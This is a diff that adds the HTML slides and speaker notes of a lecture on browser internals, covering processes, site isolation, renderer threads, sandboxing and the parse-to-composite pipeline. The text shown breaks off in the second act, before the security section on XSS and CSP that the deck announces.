@@ -1,0 +1,1544 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ctext y=%22.9em%22 font-size=%2290%22%3E🧠%3C/text%3E%3C/svg%3E">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Inside the browser — Lecture 12</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,400..800&family=Instrument+Serif:ital@0;1&family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<link rel="stylesheet" href="assets/kit.css">
+<link rel="stylesheet" href="assets/deck.css">
+<style>
+/* ---------- bespoke pieces for this deck ---------- */
+.slide code, .slide pre, .slide kbd { font-variant-ligatures: none; font-feature-settings: "calt" 0, "liga" 0; }
+.slide pre.code { white-space: pre; overflow: hidden; }
+.slide > :not(h2, .kicker, h1, .act-num) + p, .slide > div + p { margin-top: 24px; }
+.slide pre.code.xs { font-size: 19px !important; padding: 16px 20px; }
+.slide pre.code.mid { font-size: 28px; padding: 22px 34px; line-height: 1.4; }
+
+/* one signal colour per act */
+.slide.wire[data-act-num="0"] { --act: #ffffff; --act-ink: #ffffff; }
+.slide.wire[data-act-num="1"] { --act: #ffb547; --act-ink: #ffb547; }
+.slide.wire[data-act-num="2"] { --act: #3ee6ff; --act-ink: #3ee6ff; }
+.slide.wire[data-act-num="3"] { --act: #ff4fd8; --act-ink: #ff4fd8; }
+.slide.wire[data-act-num="F"] { --act: #ffffff; --act-ink: #ffffff; }
+html.theme-wire[data-act="1"] .deck-progress i { background: #ffb547; box-shadow: 0 0 12px #ffb547; }
+html.theme-wire[data-act="2"] .deck-progress i { background: #3ee6ff; box-shadow: 0 0 12px #3ee6ff; }
+html.theme-wire[data-act="3"] .deck-progress i { background: #ff4fd8; box-shadow: 0 0 12px #ff4fd8; }
+.deck-menu section[data-act="0"] h3, .deck-menu section[data-act="F"] h3 { background: #070d1a; color: #fff; }
+.deck-menu section[data-act="1"] h3 { background: #070d1a; color: #ffb547; }
+.deck-menu section[data-act="2"] h3 { background: #070d1a; color: #3ee6ff; }
+.deck-menu section[data-act="3"] h3 { background: #070d1a; color: #ff4fd8; }
+.deck-menu section[data-act="B"] h3 { background: #b6ff3b; color: #070d1a; }
+
+/* map of the day */
+.map { display: grid; grid-template-columns: 0.5fr 0.8fr 1.4fr 0.7fr 0.5fr 1.3fr 1fr 0.5fr; gap: 8px; margin-top: 12px; }
+.map div { border: 1.5px solid var(--c, #1f3052); border-radius: 8px; padding: 14px 10px; min-height: 300px; display: flex; flex-direction: column; gap: 8px; background: color-mix(in srgb, var(--c, #1f3052) 9%, #060b17); font-size: 17px; line-height: 1.3; color: #cfdcf7; }
+.map b { font: 500 20px/1 "IBM Plex Mono", monospace; color: var(--c, #8599c2); }
+.map strong { font: 700 23px/1.05 "Space Grotesk", sans-serif; color: #fff; letter-spacing: -0.03em; }
+.map time { font: 600 16px "IBM Plex Mono", monospace; margin-top: auto; color: var(--c, #8599c2); }
+.map .ex { border-style: dashed; }
+.map .brk { background: #b6ff3b; border-color: #b6ff3b; color: #070d1a; --c: #070d1a; }
+.map .brk strong { color: #070d1a; }
+.m1 { --c: #ffb547; } .m2 { --c: #3ee6ff; } .m3 { --c: #ff4fd8; } .mf { --c: #ffffff; }
+
+/* title */
+.title-grid { display: grid; grid-template-columns: minmax(0, 1fr) 640px; gap: 50px; height: 100%; align-items: center; }
+.big-title { font: 700 140px/0.88 "Space Grotesk", sans-serif; letter-spacing: -0.065em; color: #fff; margin: 30px 0 40px; }
+.big-title .b { color: #3ee6ff; text-shadow: 0 0 80px rgb(62 230 255 / 0.35); }
+.title-sub { font: 500 24px/1.5 "IBM Plex Mono", monospace; color: #8599c2; }
+.title-art { border: 1.5px solid #1f3052; border-radius: 8px; background: #040812; padding: 20px; }
+
+/* raw text panels (markup, consoles, diagrams) */
+.raw { font: 500 22px/1.5 "IBM Plex Mono", monospace; color: #cfdcf7; background: #0b1426; border: 1.5px solid #1f3052; border-radius: 8px; padding: 18px 24px; margin: 0; white-space: pre; overflow: hidden; }
+.raw.sm { font-size: 18px; padding: 14px 18px; }
+.raw.xs { font-size: 16px; line-height: 1.45; padding: 12px 16px; }
+.raw .c { color: #4d5b7a; } .raw .k { color: #ffb547; } .raw .s { color: #b6ff3b; } .raw .n { color: #3ee6ff; } .raw .m { color: #ff4fd8; } .raw .r { color: #ff6b5a; }
+
+/* code columns */
+.vs2 { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 40px; }
+.vs2 h3 { font-size: 28px; margin-bottom: 10px; }
+.vs3 { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 26px; }
+.vs3 h3 { font-size: 26px; margin-bottom: 8px; }
+
+/* tables */
+.dtable { width: 100%; border-collapse: collapse; font-size: 24px; }
+.dtable td, .dtable th { padding: 10px 14px; border-bottom: 1.5px solid #1f3052; text-align: left; vertical-align: middle; }
+.dtable th { font: 600 16px "IBM Plex Mono", monospace; text-transform: uppercase; letter-spacing: 0.1em; color: #8599c2; }
+.dtable td code { font-size: 21px; white-space: nowrap; }
+.dtable td:first-child { font-weight: 600; color: #fff; }
+.dtable .yes { color: #b6ff3b; font-weight: 700; } .dtable .no { color: #ff6b5a; font-weight: 700; } .dtable .some { color: #ffb547; font-weight: 700; }
+.dtable.tight td, .dtable.tight th { padding: 7px 12px; font-size: 21px; }
+.dtable.tight td code { font-size: 19px; }
+.dtable.tiny td, .dtable.tiny th { padding: 6px 10px; font-size: 19px; }
+.dtable.tiny td code { font-size: 17px; }
+
+/* error boxes */
+.err { font: 500 21px/1.4 "IBM Plex Mono", monospace; color: #ff8a70; background: #1a0b0b; border: 1.5px solid #5a2320; border-left: 5px solid #ff6b5a; border-radius: 6px; padding: 14px 20px; }
+
+/* catalogue cards */
+.cat { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 16px; }
+.cat .card { padding: 16px 20px; }
+.cat .card .label { margin-bottom: 8px; }
+.cat .card p { font-size: 22px; line-height: 1.35; margin: 0; color: #fff; }
+
+/* processes and threads */
+.procs { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 16px; }
+.procs .p { border: 2px solid var(--c, #1f3052); border-radius: 10px; padding: 16px 18px; background: color-mix(in srgb, var(--c, #1f3052) 10%, #060b17); display: flex; flex-direction: column; gap: 8px; }
+.procs .p b { font: 600 16px "IBM Plex Mono", monospace; letter-spacing: 0.08em; text-transform: uppercase; color: var(--c, #8599c2); }
+.procs .p strong { font: 700 27px/1.05 "Space Grotesk", sans-serif; color: #fff; letter-spacing: -0.03em; }
+.procs .p span { font: 500 18px/1.4 "IBM Plex Mono", monospace; color: #cfdcf7; }
+.procs .p.one { --c: #ffb547; } .procs .p.many { --c: #3ee6ff; } .procs .p.gpu { --c: #b6ff3b; } .procs .p.util { --c: #8599c2; }
+.procs .p .n { margin-top: auto; font: 600 15px "IBM Plex Mono", monospace; color: var(--c); }
+
+/* the five stages */
+.pipe { display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); gap: 26px; }
+.pipe .st { position: relative; border: 2px solid var(--c, #1f3052); border-radius: 10px; padding: 14px 16px; background: color-mix(in srgb, var(--c, #1f3052) 10%, #060b17); display: flex; flex-direction: column; gap: 6px; }
+.pipe .st::after { content: "→"; position: absolute; right: -22px; top: calc(50% - 16px); font: 700 22px "IBM Plex Mono", monospace; color: #8599c2; }
+.pipe .st:last-child::after { display: none; }
+.pipe .st i { font: 600 15px "IBM Plex Mono", monospace; font-style: normal; color: var(--c, #8599c2); }
+.pipe .st b { font: 700 26px/1.05 "Space Grotesk", sans-serif; color: #fff; letter-spacing: -0.03em; }
+.pipe .st span { font: 500 17px/1.35 "IBM Plex Mono", monospace; color: #cfdcf7; }
+.pipe .st em { font: 600 15px "IBM Plex Mono", monospace; font-style: normal; color: #8599c2; margin-top: auto; }
+.pipe .st.on { --c: #3ee6ff; box-shadow: 0 0 0 4px rgb(62 230 255 / 0.12); }
+.pipe .st.comp { --c: #b6ff3b; }
+.pipe .st.dim { opacity: 0.45; }
+
+/* thread / network lanes */
+.lanes { display: grid; grid-template-columns: 300px minmax(0, 1fr); gap: 10px 20px; align-items: center; }
+.lane-name { font: 500 21px/1.25 "IBM Plex Mono", monospace; color: #cfdcf7; }
+.lane-name code { font-size: 19px; }
+.lane { display: grid; grid-template-columns: repeat(20, minmax(0, 1fr)); gap: 3px; height: 40px; }
+.lane i { border-radius: 4px; background: #101c33; font: 600 14px/40px "IBM Plex Mono", monospace; font-style: normal; text-align: center; color: #060b17; overflow: hidden; white-space: nowrap; }
+.lane .parse { background: #3ee6ff; } .lane .net { background: #2a3d63; color: #8599c2; } .lane .js { background: #ffb547; } .lane .paint { background: #b6ff3b; } .lane .wait { background: #1a0b0b; border: 1.5px dashed #5a2320; color: #ff8a70; } .lane .idle { background: transparent; }
+.s1 { grid-column: span 1; } .s2 { grid-column: span 2; } .s3 { grid-column: span 3; } .s4 { grid-column: span 4; } .s5 { grid-column: span 5; } .s6 { grid-column: span 6; } .s7 { grid-column: span 7; } .s8 { grid-column: span 8; } .s9 { grid-column: span 9; } .s10 { grid-column: span 10; } .s11 { grid-column: span 11; } .s12 { grid-column: span 12; } .s13 { grid-column: span 13; } .s14 { grid-column: span 14; } .s16 { grid-column: span 16; } .s18 { grid-column: span 18; } .s20 { grid-column: span 20; }
+.lgnd { display: flex; gap: 22px; margin-top: 18px; font: 500 18px "IBM Plex Mono", monospace; color: #8599c2; }
+.lgnd span { display: flex; align-items: center; gap: 8px; }
+.lgnd em { width: 20px; height: 14px; border-radius: 3px; display: inline-block; }
+.lgnd .parse { background: #3ee6ff; } .lgnd .net { background: #2a3d63; } .lgnd .js { background: #ffb547; } .lgnd .paint { background: #b6ff3b; }
+
+/* layer stack */
+.stackviz { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 40px; align-items: start; }
+.lyr { position: relative; height: 240px; }
+.lyr div { position: absolute; left: 0; width: 72%; height: 90px; border: 2px solid #3ee6ff; border-radius: 8px; background: color-mix(in srgb, #3ee6ff 12%, #060b17); font: 600 16px/90px "IBM Plex Mono", monospace; padding-left: 16px; color: #cfdcf7; transform: skewY(-12deg); }
+.lyr .l1 { top: 120px; }
+.lyr .l2 { top: 60px; left: 14%; border-color: #ffb547; background: color-mix(in srgb, #ffb547 12%, #060b17); }
+.lyr .l3 { top: 0; left: 28%; border-color: #b6ff3b; background: color-mix(in srgb, #b6ff3b 12%, #060b17); }
+
+/* numbers */
+.nums { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 24px; }
+.nums .card { padding: 20px 24px; }
+.nums .num { font: 700 64px/1 "Space Grotesk", sans-serif; letter-spacing: -0.04em; color: var(--act); margin: 6px 0 10px; }
+.nums .card p { font-size: 21px; line-height: 1.35; margin: 0; }
+
+/* reading, cards, lists */
+.slide ul.reading li { font-size: 26px; margin-bottom: 12px; }
+.slide ul.reading .muted { font-size: 20px; }
+.slide .split > ul li, .slide .split > ol li, .slide .vs2 > ul li, .slide .split > .stack > p, .slide .vs2 > div > ul li { font-size: 27px; line-height: 1.3; margin-bottom: 14px; }
+.cards3 .card p { font-size: 23px; line-height: 1.35; }
+.cards4 .card { padding: 18px 20px; }
+.cards4 .card p { font-size: 21px; line-height: 1.35; margin: 0; }
+.slide .split > pre.code, .slide .vs2 > pre.code { align-self: start; }
+.slide ul.tightlist li { font-size: 25px; margin-bottom: 8px; }
+
+/* break: the one bright slide in the deck */
+.slide.wire.breakslide {
+  --act: #070d1a;
+  background:
+    linear-gradient(rgb(7 13 26 / 0.09) 1px, transparent 1px) 0 0 / 48px 48px,
+    linear-gradient(90deg, rgb(7 13 26 / 0.09) 1px, transparent 1px) 0 0 / 48px 48px,
+    #b6ff3b;
+  color: #070d1a;
+  justify-content: center; align-items: center; text-align: center;
+}
+.slide.breakslide::before, .slide.breakslide::after { display: none; }
+.breakslide .brk-kicker { font: 600 22px "IBM Plex Mono", monospace; letter-spacing: 0.14em; text-transform: uppercase; color: rgb(7 13 26 / 0.65) !important; margin: 0 0 10px; }
+.breakslide h2 { font: 700 170px/0.9 "Space Grotesk", sans-serif; letter-spacing: -0.06em; margin: 0; max-width: none; color: #070d1a !important; }
+.breakslide h2 em { font-style: normal; font-family: "IBM Plex Mono", monospace; font-weight: 600; letter-spacing: -0.04em; font-size: 0.55em; }
+.breakslide .brk-code { font: 500 30px/1.4 "IBM Plex Mono", monospace; background: #070d1a; color: #e3ecff; border-radius: 10px; padding: 18px 30px; margin: 34px 0 30px; white-space: pre; text-align: left; box-shadow: 10px 10px 0 rgb(7 13 26 / 0.25); }
+.breakslide .brk-code .k { color: #ff4fd8; } .breakslide .brk-code .f { color: #3ee6ff; } .breakslide .brk-code .n { color: #b6ff3b; } .breakslide .brk-code .c { color: #8599c2; }
+.breakslide .timer { font-size: 96px; border-width: 6px; color: #070d1a; border-color: #070d1a; }
+.breakslide p:not(.brk-kicker) { font-size: 26px; color: rgb(7 13 26 / 0.75) !important; max-width: 1100px; margin-top: 30px; }
+
+/* exercises */
+.slide.exercise ol > li { font-size: 28px; }
+.slide.exercise .dtable td, .slide.exercise .dtable th { font-size: 21px; padding: 7px 12px; }
+.slide.exercise .rule { font: 600 21px/1.4 "IBM Plex Mono", monospace; color: #ff8a70; background: #1a0b0b; border: 1.5px solid #5a2320; border-left: 5px solid #ff6b5a; border-radius: 6px; padding: 12px 18px; margin-top: 14px; }
+</style>
+</head>
+<body>
+<main class="deck">
+
+<!-- =====================================================================
+     PROLOGUE
+     ===================================================================== -->
+
+<section class="no-chrome" data-act="0" data-act-name="Prologue" data-at="0:00" data-theme="wire" data-title="Inside the browser.">
+  <div class="title-grid">
+    <div>
+      <p class="kicker">Programming Interactivity · Lecture 12</p>
+      <h1 class="big-title">Inside the <span class="b">browser.</span></h1>
+      <p class="title-sub">processes · threads · bytes to pixels · origins · XSS · CSP · a CTF</p>
+      <p class="title-sub">Materials: <a href="https://lopin.me/harbour/programming-interactivity-12-inside-the-browser/" target="_blank" rel="noopener">12-inside-the-browser</a></p>
+    </div>
+    <div class="title-art" aria-hidden="true">
+<pre class="raw xs">  <span class="k">browser process</span>   <span class="c">UI · navigation · permissions</span>
+         │
+    <span class="c">IPC</span>  ├──── <span class="n">renderer</span>  <span class="c">news.example</span>
+         ├──── <span class="n">renderer</span>  <span class="c">ads.example</span>
+         ├──── <span class="s">GPU process</span>
+         └──── <span class="c">utility: audio, network, …</span>
+
+  <span class="n">renderer</span> <span class="c">=</span> main thread <span class="c">+</span> compositor
+             <span class="c">+</span> raster threads <span class="c">+</span> workers</pre>
+    </div>
+  </div>
+  <aside class="notes">
+    <p>~0:00. Two topics, one model. First: how bytes become pixels, stage by stage, and which thread runs each stage. Second: the security boundaries built on the same processes, and the attacks they stop. Have <code>demos/compositor.html</code> open in a second window and Chrome's Task Manager ready (⋮ → More tools → Task Manager, or Shift+Esc).</p>
+  </aside>
+</section>
+
+<section data-title="The day">
+  <p class="kicker">The plan · about 3 h</p>
+  <h2>Two halves: speed, then safety</h2>
+  <div class="map">
+    <div class="mf"><b>00</b><strong>Open</strong>who is drawing?<time>0:00</time></div>
+    <div class="m1"><b>01</b><strong>Processes</strong>one browser, many processes and threads<time>0:05</time></div>
+    <div class="m2"><b>02</b><strong>Bytes to pixels</strong>parse, style, layout, paint, composite<time>0:15</time></div>
+    <div class="m2 ex"><b>✎ 1</b><strong>Five broken pages</strong>name the stage, fix it · 20 min<time>1:00</time></div>
+    <div class="brk"><b>☕</b><strong>Break</strong>15 min<time>1:20</time></div>
+    <div class="m3"><b>03</b><strong>Origins &amp; attacks</strong>XSS, CSP, cookies, frames<time>1:35</time></div>
+    <div class="m3 ex"><b>⚑</b><strong>CTF</strong>break it, fix it, debrief · 35 min<time>2:20</time></div>
+    <div class="mf"><b>✓</b><strong>Close</strong><time>2:55 → 3:00</time></div>
+  </div>
+  <p>Two running pages: a <strong>news article</strong> for the first half, a <strong>recipe site</strong> for the second.</p>
+  <aside class="notes">
+    <p>~0:01. Say the shape out loud: the first half is why a page is slow, the second is why a page is dangerous, and both answers come from the same diagram — which process, which thread, which origin. Lecture 9 measured the pipeline; today we open it.</p>
+  </aside>
+</section>
+
+<section data-title="Cold open">
+  <p class="kicker">demos/compositor.html · click "Busy for 3 s"</p>
+  <h2>Three boxes move. One JavaScript thread. Predict.</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="c">/* box 1 */</span>  <span class="k">@keyframes</span> by-left {
+    <span class="n">from</span> { <span class="m">left</span>: 0 } <span class="n">to</span> { <span class="m">left</span>: calc(100% - 48px) }
+  }
+
+<span class="c">/* box 2 */</span>  <span class="k">@keyframes</span> by-transform {
+    <span class="n">from</span> { <span class="m">transform</span>: translateX(0) } …
+  }
+
+<span class="c">/* box 3 */</span>  requestAnimationFrame(tick)
+          <span class="c">// sets transform every frame</span>
+
+  <span class="r">while (performance.now() &lt; end) {}</span>  <span class="c">// 3 s</span></pre>
+    <div class="stack">
+      <div class="reveal-box step solid">Box 1 (<code>left</code>) <strong>freezes</strong>. Box 2 (<code>transform</code>) <strong>keeps moving</strong>. Box 3 (rAF) freezes.</div>
+      <div class="reveal-box step">The page still <strong>scrolls</strong>.</div>
+      <div class="reveal-box step">One main thread, blocked for all three. So <em class="s">what else is drawing?</em></div>
+    </div>
+  </div>
+  <aside class="notes">
+    <p>~0:02. Ask for a show of hands per box before revealing. Click the button, let all three seconds pass, scroll the feed while it is blocked. Box 2 is a CSS animation of <code>transform</code>, which the compositor runs on its own thread; box 1 animates <code>left</code>, which needs layout on the main thread; box 3 needs the main thread to run JavaScript at all. Don't explain yet — slide 27 comes back to this demo. If the room is in Safari or Firefox the result is the same; the thread names differ.</p>
+  </aside>
+</section>
+
+<section class="statement" data-title="Thesis">
+  <p class="kicker">The whole lecture in one sentence</p>
+  <h2>A browser is a set of processes and threads. Knowing which one does what explains both speed and safety.</h2>
+  <p class="muted">Every loading problem is one stage waiting on another. Every frontend attack is someone else's code or request acting with your origin's rights.</p>
+  <aside class="notes">
+    <p>~0:04. Write the three questions on the board for the whole class: <strong>which stage is the user waiting on?</strong>, <strong>which thread runs it?</strong> and <strong>whose code runs on this origin?</strong> The first half answers the first two, the second half the third.</p>
+  </aside>
+</section>
+
+<!-- =====================================================================
+     ACT 1 · PROCESSES AND THREADS
+     ===================================================================== -->
+
+<section class="act" data-act="1" data-act-name="Processes and threads" data-at="0:05" data-title="Act 1 — Processes and threads">
+  <div class="act-deco">⬛</div>
+  <div class="act-num">act 01</div>
+  <h1>Processes and threads</h1>
+  <div class="act-meta"><span class="chip">0:05 – 0:15</span><span>what the map looks like</span></div>
+  <div class="act-list"><span>browser process</span><span>renderers</span><span>GPU</span><span>site isolation</span><span>main thread</span><span>compositor</span><span>raster</span><span>workers</span><span>sandbox</span><span>IPC</span></div>
+</section>
+
+<section data-title="Many processes">
+  <p class="kicker">Chrome · Window → Task Manager (Shift+Esc on Windows / Linux)</p>
+  <h2>One browser, many operating-system processes</h2>
+  <div class="procs">
+    <div class="p one"><b>one</b><strong>Browser process</strong><span>Tabs, address bar, menus, navigation, permission prompts. Decides what each renderer may reach.</span><span class="n">privileged</span></div>
+    <div class="p many"><b>per site</b><strong>Renderer</strong><span>DOM, CSS, JavaScript, layout, paint. Never shared between sites.</span><span class="n">sandboxed</span></div>
+    <div class="p gpu"><b>one</b><strong>GPU process</strong><span>Turns paint commands into pixels for every tab and the UI itself.</span><span class="n">talks to the driver</span></div>
+    <div class="p util"><b>several</b><strong>Utility</strong><span>Network service (holds the cookie jar), storage, audio, media decoding.</span><span class="n">one job each</span></div>
+  </div>
+  <p>Keep the Task Manager open: one row per process, with its memory and CPU.</p>
+  <aside class="notes">
+    <p>~0:05. Do it live: open the Task Manager, sort by memory, point at the tab rows and the "Subframe:" rows. This is why a browser looks like it uses a lot of memory — it is a dozen processes, not one. Firefox and Safari split differently (Firefox isolates per site since Fission in 2021; Safari runs WebContent processes per tab) but the idea is the same. The point for us: the page's code lives in a renderer and reaches everything else only by asking.</p>
+  </aside>
+</section>
+
+<section data-title="Site isolation">
+  <p class="kicker">Chrome 67, 2018 · after Spectre</p>
+  <h2>Sites never share a renderer, and a frame counts separately</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="c">// news.example/article</span>
+&lt;iframe src=<span class="s">"https://ads.example/banner"</span>&gt;
+
+<span class="c">Task Manager:</span>
+  Tab: Today's news        <span class="n">renderer A</span>
+  Subframe: ads.example    <span class="m">renderer B</span></pre>
+    <ul>
+      <li>A cross-site iframe gets <strong>its own process</strong>, so its memory never sits next to yours.</li>
+      <li>Spectre showed that code can read any memory in its own process, whatever the language-level checks. The fix was to stop putting two sites in one process.</li>
+      <li>A crashed or frozen renderer takes down <strong>one site's frames</strong>, not the browser.</li>
+      <li>"Site", not origin: <code>a.news.example</code> and <code>b.news.example</code> can share a process.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:07. Spectre (January 2018) was a CPU bug: speculative execution left timing traces that let code read memory it shouldn't. No software fix inside a process was reliable, so Chrome made the process boundary the security boundary and shipped site isolation for desktop in Chrome 67. The cost is memory, which is why mobile got it later and only for sites you log into. Two consequences we use later: a hostile iframe can't read your memory, and <code>SharedArrayBuffer</code> / high-resolution timers need extra headers (COOP/COEP) to come back.</p>
+  </aside>
+</section>
+
+<section data-title="Inside a renderer">
+  <p class="kicker">One process, several threads</p>
+  <h2>Inside a renderer: who runs what</h2>
+  <table class="dtable">
+    <tr><th>thread</th><th>runs</th><th>blocked by</th></tr>
+    <tr><td>main</td><td>HTML and CSS parsing, <strong>your JavaScript</strong>, style, layout, paint recording</td><td class="no">one slow task blocks all of it</td></tr>
+    <tr><td>compositor</td><td>scrolling, <code>transform</code> / <code>opacity</code> animations, assembling layers into frames</td><td class="some">non-passive listeners; anything that needs a new frame from main</td></tr>
+    <tr><td>raster workers</td><td>scheduling tiles, decoding images; pixels are drawn in the GPU process</td><td class="yes">independent</td></tr>
+    <tr><td>web workers</td><td>your JavaScript, off the main thread, no DOM (Lecture 9)</td><td class="yes">independent</td></tr>
+  </table>
+  <p class="muted">The event loop you met in Lecture 8 is the main thread's loop. Everything that competes with your code lives on that one line.</p>
+  <aside class="notes">
+    <p>~0:09. This table is the spine of Act 2: every stage we open belongs to one of these rows. Name the demo again — box 2 kept moving because it never needed row 1. Blink also has a compositor thread per renderer and a pool of raster workers sized to the machine; the numbers don't matter, the split does.</p>
+  </aside>
+</section>
+
+<section data-title="Sandboxed">
+  <p class="kicker">Why a page has to ask</p>
+  <h2>A renderer can't touch the disk, the network or the camera</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="c">// in the page's renderer</span>
+fetch(<span class="s">"/api/articles"</span>)
+   <span class="c">→ IPC →</span> <span class="k">network service</span>
+   <span class="c">  (a loader locked to this origin)</span>
+
+navigator.mediaDevices.getUserMedia(…)
+   <span class="c">→ IPC →</span> <span class="k">browser process</span> <span class="c">→ prompt → OS</span></pre>
+    <ul>
+      <li>The renderer process runs with almost no OS rights: no file access, no sockets, no devices.</li>
+      <li>Everything goes over <strong>IPC</strong> to a more privileged process, which checks it first.</li>
+      <li>That check is where the permission prompts of Lecture 11 and the origin rules of Lecture 8 are enforced.</li>
+      <li>A bug in the renderer is not yet a compromised machine: an attacker also needs a <strong>sandbox escape</strong>.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:11. Useful model for the second half: page code can only send requests over IPC, and the browser process decides what each request may do, so "the client holds no secrets" (Meridian) and "the user's cookies travel with the request" are both decisions made out there, not in the page. Chrome pays bug bounties in two tiers for this reason: renderer RCE alone is worth less than a full chain with a sandbox escape.</p>
+  </aside>
+</section>
+
+<!-- =====================================================================
+     ACT 2 · FROM BYTES TO PIXELS
+     ===================================================================== -->
+
+<section class="act" data-act="2" data-act-name="From bytes to pixels" data-at="0:15" data-title="Act 2 — From bytes to pixels">
+  <div class="act-deco">▦</div>
+  <div class="act-num">act 02</div>
+  <h1>From bytes to pixels</h1>
+  <div class="act-meta"><span class="chip">0:15 – 1:00</span><span>five stages, opened one by one</span></div>
+  <div class="act-list"><span>navigation</span><span>parser</span><span>defer</span><span>preload scanner</span><span>cascade</span><span>layout tree</span><span>display list</span><span>stacking</span><span>layers</span><span>raster</span><span>compositor</span><span>Web Vitals</span></div>
+</section>
+
+<section data-title="The five stages">
+  <p class="kicker">Lecture 9's frame, with loading in front</p>
+  <h2>Today we open each one</h2>
+  <div class="pipe">
+    <div class="st on"><i>1</i><b>Parse</b><span>HTML → DOM, CSS → style rules</span><em>main thread</em></div>
+    <div class="st on"><i>2</i><b>Style</b><span>every property of every element, resolved</span><em>main thread</em></div>
+    <div class="st on"><i>3</i><b>Layout</b><span>a box tree with positions and sizes</span><em>main thread</em></div>
+    <div class="st on"><i>4</i><b>Paint</b><span>a list of draw operations, in order</span><em>main thread</em></div>
+    <div class="st comp"><i>5</i><b>Composite</b><span>layers rastered and assembled into a frame</span><em>compositor + raster + GPU</em></div>
+  </div>
+  <p>Your JavaScript runs on the same main thread, between these. For each stage: <strong>what it produces</strong> and <strong>which thread runs it</strong>.</p>
+  <aside class="notes">
+    <p>~0:15. Remind them of the Performance panel from Lecture 9: the blue (parse), purple (style, layout) and green (paint, composite) blocks in a frame are exactly these stages. The first four belong to one thread, the fifth does not — that single fact explains the cold open. Loading comes first because a page can't reach stage 2 before stage 1 has bytes.</p>
+  </aside>
+</section>
+
+<section data-title="Navigation">
+  <p class="kicker">Loading · the article page</p>
+  <h2>Parsing starts long before the last byte</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="c">// browser process + network service</span>
+DNS      news.example  → 93.184.…
+TCP      handshake
+TLS      handshake
+GET /article/42
+         <span class="c">… time to first byte …</span>
+
+<span class="c">// the response body streams in, in chunks</span>
+&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;link …   <span class="n">chunk 1</span>
+&lt;p&gt;The council voted …                 <span class="n">chunk 2</span></pre>
+    <ul>
+      <li>The navigation happens in the <strong>browser process</strong>; the response is handed to a renderer.</li>
+      <li>HTML is parsed <strong>incrementally</strong>: the first chunk builds DOM while the rest is still in flight.</li>
+      <li>A server that assembles the whole page before sending (and then sends it at once) throws that away.</li>
+      <li>The renderer may be <strong>reused or swapped</strong>: a cross-site navigation gets a fresh process.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~0:16. The practical consequence of streaming: send the <code>&lt;head&gt;</code> early. A server that flushes the head while the database query is still running lets the browser start fetching the stylesheet and the font during that query. That is what "streaming SSR" and the newer <code>103 Early Hints</code> status are about. In the Network panel, the green "waiting (TTFB)" bar is the part before chunk 1 and the blue bar is the streaming part.</p>
+  </aside>
+</section>
+
+<section data-title="The HTML parser">
+  <p class="kicker">Why broken HTML still renders</p>
+  <h2>Tokenizer → tree builder. It never throws</h2>
+  <div class="vs2">
+    <div>
+      <h3>what you sent</h3>
+      <script type="text/x-code" data-lang="html" class="xs"><p>First
+<p>Second
+<b>bold <i>both</b> italic?</i>
+<table>
+  <div>oops</div>
+  <tr><td>cell</td></tr>
+</table></script>
+    </div>
+    <div>
+      <h3>the tree you got</h3>
+<pre class="raw xs">p  <span class="c">"First"</span>
+p  <span class="c">"Second"</span>
+  b → <span class="c">"bold "</span>, i → <span class="c">"both"</span>
+  i  <span class="c">← re-opened outside the b</span>
+div <span class="c">← moved BEFORE the table</span>
+table → tbody <span class="c">← invented</span>
+  → tr → td</pre>
+    </div>
+  </div>
+  <ul class="tightlist">
+    <li>Error recovery is <strong>in the spec</strong>, step by step: every browser builds the same wrong tree from the same wrong HTML.</li>
+    <li>So the DOM in the Elements panel is the <strong>parser's output</strong>, not your file. Always compare the two.</li>
+    <li><code>innerHTML</code> runs the same parser, with the same rules. That matters in Act 3.</li>
+  </ul>
+  <aside class="notes">
+    <p>~0:18. Do it live in the Elements panel on a scratch page that starts with <code>&lt;!doctype html&gt;</code> — in quirks mode <code>&lt;table&gt;</code> doesn't close the <code>&lt;p&gt;</code> and the tree differs: the <code>&lt;div&gt;</code> inside <code>&lt;table&gt;</code> getting "foster parented" out of the table is the one that always surprises. The spec calls the list of recovery rules the tree construction algorithm; it exists because the web is full of broken HTML and every browser has to recover from it the same way. XML (and XHTML served as XML) does throw — that is why nobody serves it.</p>
+  </aside>
+</section>
+
+<section data-title="Scripts stop the parser">
+  <p class="kicker">One slow script in the head costs you the whole page</p>
+  <h2>A classic <code>&lt;script&gt;</code> blocks parsing until it has run</h2>
+  <div class="lanes">
+    <div class="lane-name"><code>&lt;script src&gt;</code> <span class="muted">classic</span></div>
+    <div class="lane"><i class="parse s3">parse</i><i class="net s7">fetch — parser stopped</i><i class="js s3">run</i><i class="parse s7">parse</i></div>
+    <div class="lane-name"><code>&lt;script defer&gt;</code></div>
+    <div class="lane"><i class="parse s10">parse (fetch in parallel)</i><i class="js s3">run</i><i class="paint s7">DOMContentLoaded</i></div>
+    <div class="lane-name"><code>&lt;script async&gt;</code></div>
+    <div class="lane"><i class="parse s5">parse + fetch</i><i class="js s3">run</i><i class="parse s12">parse</i></div>
+    <div class="lane-name"><code>&lt;script type="module"&gt;</code></div>
